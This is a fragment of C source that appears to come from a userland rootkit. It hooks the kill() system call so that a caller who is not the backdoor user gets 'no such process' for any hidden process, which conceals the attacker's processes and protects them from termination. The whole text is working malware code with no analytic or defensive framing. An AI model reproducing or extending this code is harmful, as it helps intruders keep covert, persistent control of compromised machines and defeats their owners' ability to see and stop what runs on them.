int kill(pid_t pid, int sig){
    if(is_bdusr()) goto o_kill;

    if(hidden_proc(pid)){
        errno = ESRCH;
        return -1;
    }
o_kill:
    hook(CKILL);
    return (long)call(CKILL, pid, sig);
}